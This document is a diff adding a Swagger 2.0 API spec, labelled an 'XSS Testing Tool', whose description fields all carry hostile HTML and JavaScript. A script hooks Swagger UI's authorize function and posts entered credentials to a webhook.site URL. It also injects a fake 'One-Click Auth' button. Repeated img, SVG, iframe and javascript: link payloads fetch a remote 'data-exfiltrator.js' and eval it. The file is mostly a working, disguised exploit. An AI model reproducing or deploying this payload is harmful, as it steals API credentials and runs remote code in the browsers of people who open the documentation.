@@ -1,0 +1,151 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Swagger UI XSS Testing Tool
+  description: |
+    <div>
+      <!-- Poisoning the UI Object directly -->
+      <script>
+        // Wait for Swagger UI to initialize
+        setTimeout(function() {
+          try {
+            // Check if Swagger UI object exists
+            if (window.ui) {
+              console.log("Found Swagger UI object, attempting exploitation...");
+              
+              // Method 1: Attempt to poison the spec object to add malicious endpoints
+              if (window.ui.getState && window.ui.specActions) {
+                // Create a malicious spec update
+                const origSpec = window.ui.getState().get("spec").toJS();
+                
+                // Add our malicious endpoint with XSS payload in description
+                if (origSpec && origSpec.paths) {
+                  origSpec.paths["/xss/test"] = {
+                    "get": {
+                      "description": "<img src=x onerror='fetch(\"https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js\").then(r=>r.text()).then(eval)'>",
+                      "responses": {"200": {"description": "XSS Test"}}
+                    }
+                  };
+                  
+                  // Use internal API to update the spec
+                  window.ui.specActions.updateSpec(JSON.stringify(origSpec));
+                }
+              }
+              
+              // Method 2: Hook into the authorize function to steal credentials
+              if (window.ui.authActions && window.ui.authActions.authorize) {
+                const origAuthorize = window.ui.authActions.authorize;
+                window.ui.authActions.authorize = function(auth) {
+                  // Exfiltrate authentication data
+                  const authData = JSON.stringify(auth);
+                  
+                  // Send credentials to external server
+                  fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({type: 'swagger_auth', data: authData}),
+                    mode: 'no-cors'
+                  });
+                  
+                  // Call original function
+                  return origAuthorize(auth);
+                };
+              }
+              
+              // Method 3: Attempt to inject elements into the DOM
+              // Create a malicious element
+              const authButton = document.createElement('button');
+              authButton.innerText = 'One-Click Auth';
+              authButton.className = 'btn authorize';
+              authButton.onclick = function() {
+                fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js')
+                  .then(r => r.text())
+                  .then(eval);
+              };
+              
+              // Try to add it to the UI
+              setTimeout(function() {
+                const authContainer = document.querySelector('.auth-wrapper') || 
+                                      document.querySelector('.swagger-ui') ||
+                                      document.body;
+                if (authContainer) {
+                  authContainer.appendChild(authButton);
+                }
+              }, 1000);
+            }
+          } catch (e) {
+            console.error("Error in Swagger UI XSS payload:", e);
+          }
+        }, 1500);
+      </script>
+      
+      <!-- Method 4: SVG-based XSS -->
+      <svg width="0" height="0">
+        <image href="x" onerror="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)" />
+      </svg>
+      
+      <h3>API Documentation</h3>
+      <p>Author: CyberTechAjju</p>
+    </div>
+    
+paths:
+  /test/endpoint:
+    get:
+      summary: Test Endpoint
+      description: |
+        <div id="xss-container">
+          <a href="javascript:fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)">View API Details</a>
+        </div>
+      responses:
+        '200':
+          description: Success
+          
+  /users:
+    post:
+      summary: Create User
+      description: |
+        Creates a new user.
+        <iframe srcdoc="<script>fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)</script>" style="width:0;height:0;border:0"></iframe>
+      parameters:
+        - name: user
+          in: body
+          description: |
+            User object with <img src="x" onerror="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)"> details.
+          schema:
+            type: object
+            properties:
+              username:
+                type: string
+              email:
+                type: string
+              password:
+                type: string
+      responses:
+        '201':
+          description: User created
+
+  # Parameter value-based XSS testing
+  /search/{query}:
+    get:
+      summary: Search
+      parameters:
+        - name: query
+          in: path
+          description: |
+            Search query with <a href="#" onclick="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)">advanced options</a>
+          required: true
+          type: string
+      responses:
+        '200':
+          description: Search results
+          
+securityDefinitions:
+  apiKey:
+    type: apiKey
+    name: api_key
+    in: header
+    description: |
+      <div>
+        API Key Authentication
+        <img src="x" onerror="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)">
+      </div> 
